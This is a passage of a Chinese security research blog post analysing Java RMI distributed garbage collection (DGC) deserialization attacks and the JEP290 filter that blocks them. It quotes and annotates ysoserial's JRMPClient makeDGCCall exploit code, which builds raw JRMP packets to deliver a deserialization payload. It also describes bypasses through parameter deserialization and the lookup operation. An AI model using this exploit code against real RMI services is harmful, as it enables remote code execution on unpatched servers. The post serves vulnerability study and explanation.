@@ -1,0 +1,164 @@
+一致的漏洞触发点，没问题。可以看到这里触发点的话无论是选dirty那条线还是clean那条线都是一样的。
+那客户端怎样与服务端通讯呢，之前RMIRegistryExploit是`bind（name,payload）`这里插入payload，然后传输到服务端。
+**DGC这里我们客户端在哪里可以插入payload？**
+此处我自己并没有找到一个与`bind()`类似的封装好的方法，可以方便我们调试的直接发起一个DGC层的请求。但是我们在`sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)`处下一个断点，然后在`sun.rmi.transport.DGCImpl#dirty`下一个断点，调试github上的ServerAndRegister.java就可以得到这个DGC层的通讯客户端-服务端的过程（是在bind()绑定对象的时候产生的通讯）
+> 跟RMI-> register这些一样，DGCImpl_Skel是服务端代码，DGCImpl_Stub是客户端代码；但是这两个class也跟我们之前说的一样（动态生成？），总之是无法下断点调试的。所以在其内部调用的其他方法下断点来调试。
+>
+>
+> 然后感谢[这个老哥](https://www.anquanke.com/post/id/204740)给了个例子，客户端lookup也会产生DGC通讯。（其实大多操作都会有DGC，这里抄一下放在github中嘿嘿）但是仍然先来看ServerAndRegister.java的通讯
+DGC客户端处：
+DGC服务端处：
+根据客户端调用栈来回退到`DGCImpl_Stub`的`dirty`方法，去看应该在哪里插入payload（clean其实也一样）就看`sun.rmi.transport.DGCImpl_Stub#dirty`好了
+    public Lease dirty(ObjID[] var1, long var2, Lease var4) throws RemoteException {
+            try {
+                //开启了一个连接，似曾相识的 669196253586618813L 在服务端也有
+                RemoteCall var5 = super.ref.newCall(this, operations, 1, -669196253586618813L);
+                try {
+                    //获取连接的输入流
+                    ObjectOutput var6 = var5.getOutputStream();
+                    //写入一个对象，在实现的本意中，这里是一个ID的对象列表ObjID[]
+                    //***这里就是我们payload写入的地方***
+                    var6.writeObject(var1);
+                    //------                    var6.writeLong(var2);
+                    var6.writeObject(var4);
+                } catch (IOException var20) {
+                    throw new MarshalException("error marshalling arguments", var20);
+                }
+                super.ref.invoke(var5);
+                Lease var24;
+                try {
+                    ObjectInput var9 = var5.getInputStream();
+                    var24 = (Lease)var9.readObject();
+                //省略大量错误处理..
+        }
+这里我们就找到了DGC客户端该放payload的地方，和DGC服务端触发反序列化的地方。
+接下就是去实现一个POC，把payload放进去。可以发现我们去寻找的DGC客户端该放payload的地方调用栈很深，这代表着我们从顶层开始传输payload一直到我们想要放置payload的参数，payload不变可能性极低或难度极大。所以针对这种很底层的payload的poc构建通常使用自实现一个客户端去拼接序列化数据包。
+Ysoserial的JRMP-Client exploit模块就是这么实现的，其核心在于`makeDGCCall`方法：
+    //传入目标RMI注册端（也是DGC服务端）的IP端口，以及攻击载荷的payload对象。
+    public static void makeDGCCall ( String hostname, int port, Object payloadObject ) throws IOException, UnknownHostException, SocketException {
+            InetSocketAddress isa = new InetSocketAddress(hostname, port);
+            Socket s = null;
+            DataOutputStream dos = null;
+            try {
+                //建立一个socket通道，并为赋值
+                s = SocketFactory.getDefault().createSocket(hostname, port);
+                s.setKeepAlive(true);
+                s.setTcpNoDelay(true);
+               //读取socket通道的数据流
+                OutputStream os = s.getOutputStream();
+                dos = new DataOutputStream(os);
+               //*******开始拼接数据流*********
+                //以下均为特定协议格式常量，之后会说到这些数据是怎么来的
+                //传输魔术字符：0x4a524d49（代表协议）
+                dos.writeInt(TransportConstants.Magic);
+                //传输协议版本号：2（就是版本号）
+                dos.writeShort(TransportConstants.Version);
+                //传输协议类型: 0x4c (协议的种类，好像是单向传输数据，不需要TCP的ACK确认)
+                dos.writeByte(TransportConstants.SingleOpProtocol);
+               //传输指令-RMI call：0x50 
+                dos.write(TransportConstants.Call);
+                @SuppressWarnings ( "resource" )
+                final ObjectOutputStream objOut = new MarshalOutputStream(dos);
+               //DGC的固定读取格式，等会具体分析
+                objOut.writeLong(2); // DGC
+                objOut.writeInt(0);
+                objOut.writeLong(0);
+                objOut.writeShort(0);
+               //选取DGC服务端的分支选dirty
+                objOut.writeInt(1); // dirty
+                //然后一个固定的hash值
+                objOut.writeLong(-669196253586618813L);
+                //我们的反序列化触发点
+                objOut.writeObject(payloadObject);
+                os.flush();
+            }
+        }
+简单分析了一下POC数据包的构成，但是还是尝试搞清楚为什么是这个拼接顺序，为什么要这个值，感觉好玩一些。
+我们可以通过在DGC服务端，CC链最终的触发处`org.apache.commons.collections.functors.InvokerTransformer#transform`处下一个断点，然后客户端使用YSO的exploit
+JRMPClient攻击服务端，从而得到受攻击服务端的调用栈，然后再回过头分析。
+可以得到下面调用栈，在1-5的地方均有POC生成序列化数据必须满足的条件。
+具体的因为好玩画了一张POC与服务端解析位置一一对应的图，图中有具体的反序列化点的方法以及行数同时用Qx来做了对应。（呼，1个小时作图..真爽，协议可以参考[官方文档](https://docs.oracle.com/javase/8/docs/platform/rmi/spec/rmi-protocol3.html)）
+payload触发点没有在上面的图上，因为之前刚分析过了在`sun.rmi.transport.DGCImpl_Skel#dispatch`，这里没放进去。
+此外DGC固定读取格式也是固定的，在`sun.rmi.transport.Transport#serviceCall`读取了参数之后进行了校验
+    try {
+         id = ObjID.read(call.getInputStream());
+     } catch (java.io.IOException e) {
+         throw new MarshalException("unable to read objID", e);
+     }
+    /* get the remote object */
+    //该dgcID是一个常量，此处进行了验证
+    Transport transport = id.equals(dgcID) ? null : this;
+    //根据读取出来的id里面的[0，0，0]（三个都是我们序列化写入的值）分别是：
+    //1.服务端uid给客户端的远程对象唯一标识编号
+    //2.远程对象有效时长用的时间戳
+    //3.用于同一时间申请的统一远程对象的另一个用于区分的随机数
+    //服务端去查询这三个值的hash，判断当前DGC客户端有没有服务端的远程对象
+    //就是dirty，clean那一套东西
+    Target target =
+    ObjectTable.getTarget(new ObjectEndpoint(id, transport));
+    if (target == null || (impl = target.getImpl()) == null) {
+    throw new NoSuchObjectException("no such object in table");
+    }
+dgcID：
+    //dgcID位置sun.rmi.transport.Transport
+    /** ObjID for DGCImpl */
+        private static final ObjID dgcID = new ObjID(ObjID.DGC_ID);
+    //ObjID.DGC_ID位置：java.rmi.server.ObjID
+         public static final int DGC_ID = 2;
+而这里的2之后的三个0，我们因为攻击服务端，没有去服务端获取过远程对象所以都写成0即可，不然会报错。
+至此DGC层的原理分析以及Ysoserial exploit
+JRMPClient模块原理分析就完成了。仔细分析自主构建的POC之后会发现这种看着小齿轮完美切合的感觉，相当美感。
+### JEP290修复
+在JEP290规范之后，即JAVA版本6u141, 7u131, 8u121之后，以上攻击就不奏效了。
+同样被白名单过滤了，`sun.rmi.transport.DGCImpl#checkInput`过滤器：
+    private static Status checkInput(FilterInfo var0) {
+            //与`sun.rmi.registry.RegistryImpl#registryFilter`处过滤器完全一致
+            if (dgcFilter != null) {
+                Status var1 = dgcFilter.checkInput(var0);
+                if (var1 != Status.UNDECIDED) {
+                    return var1;
+                }
+            }
+            if (var0.depth() > (long)DGC_MAX_DEPTH) {
+                return Status.REJECTED;
+            } else {
+                Class var2 = var0.serialClass();
+                if (var2 == null) {
+                    return Status.UNDECIDED;
+                } else {
+                    while(var2.isArray()) {
+                        if (var0.arrayLength() >= 0L && var0.arrayLength() > (long)DGC_MAX_ARRAY_SIZE) {
+                            return Status.REJECTED;
+                        }
+                        var2 = var2.getComponentType();
+                    }
+                    if (var2.isPrimitive()) {
+                        return Status.ALLOWED;
+                    } else {
+                        //4种白名单限制
+                        return var2 != ObjID.class &&
+                            var2 != UID.class &&
+                            var2 != VMID.class &&
+                            var2 != Lease.class ? Status.REJECTED : Status.ALLOWED;
+                    }
+                }
+            }
+        }
+## 为什么RMI客户端利用传递参数反序列化攻击RMI服务端就不受JEP290限制
+那是因为JEP290提供了一些系列过滤器形式：进程级过滤器、自定义过滤器、内置过滤器。但是默认只为 **RMI注册表** 和 **RMI分布式垃圾收集器**
+提供了相应的内置过滤器。这两个过滤器都配置为白名单，即只允许反序列化特定类。（就像我们上面看到的一样）
+但是RMI客户端利用参数反序列化攻击没有也不能跟 **RMI注册表** 和 **RMI分布式垃圾收集器**
+一样使用内置白名单过滤器。使用了，全给你白名单拦截了，我还怎么序列化传输参数数据，参数数据我甚至要自定义一个类，咋可能在你这小小的白名单中？
+这就是安全性与实际使用场景相冲突导致的，已知的但是迫不得已无法修复的漏洞。
+## 小结
+探测利用开放的RMI服务：
+  1. 实际上就是蒙，赌它有这些漏洞RMI服务。
+RMI客户端反序列化攻击RMI服务端：
+  1. 不一定是要Object类型的接口才行，只要不是基本类型的参数都可以利用。
+RMI服务端反序列化攻击RMI注册端：
+  1. RMI服务端利用bind攻击注册端的时候，找各种办法把payload变成remote接口这个举动是非必须的，注册端反序列化触发压根不校验。只是为了exp实现而已。
+  2. 在将payload变成remote接口的过程中，利用到动态代理，但是压根没有利用到动态代理的"拦截器特性"，只是利用了动态代理可以将任意对象转化接口形式的特性。
+  3. 在8u141之后，在利用bind等服务端对于注册端发起的操作时，会因为注册端对于服务端有地址验证而失效。
+  4. 利用lookup操作，作为客户端对于注册端发起请求，可以绕过上面的地址验证。
+## 参考
+参考统一放在下篇中
